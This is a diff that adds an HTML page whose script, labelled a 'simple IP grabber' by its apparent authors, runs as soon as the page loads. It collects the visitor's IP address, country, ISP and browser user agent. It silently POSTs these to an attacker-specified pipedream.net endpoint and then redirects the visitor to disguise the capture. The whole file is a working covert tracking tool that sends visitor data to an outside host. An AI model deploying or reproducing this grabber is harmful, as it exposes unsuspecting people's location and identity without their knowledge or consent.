@@ -1,0 +1,50 @@
+<html>
+<script>
+  // Simple IP grabber
+  // Made by Jayy // FiskDk // f1sk
+  
+  let redirect = location.href.split("?")[1]
+  let pipedream = location.href.split("#")[1].replace("?" + redirect, "")
+  let ip = "";
+  var opts = {
+    method: 'GET',
+    headers: {}
+  };
+  fetch('https://api.ipify.org/?format=json', opts).then(function (response) {
+      return response.json();
+    })
+    .then(function (body) {
+      var ip = body.ip
+      fetch('http://ip-api.com/json/' + ip, opts).then(function (response) {
+          return response.json();
+        })
+        .then(function (body) {
+          const info = {
+            "ip": ip,
+            "country": body.country,
+            "isp": body.isp,
+            "agent": navigator.userAgent
+          }
+          const headers = new Headers()
+          headers.append("Content-Type", "application/json")
+          const _body = {
+            "output": info
+          }
+          const options = {
+            method: "POST",
+            headers,
+            mode: "cors",
+            body: JSON.stringify(_body),
+          }
+
+          fetch("https://" + pipedream + ".m.pipedream.net", options).then(response => {
+            location.href = "http://" + redirect
+          }).catch(err => {
+            console.error("[error] " + err.message)
+          })
+
+        });
+    });
+</script>
+
+</html>
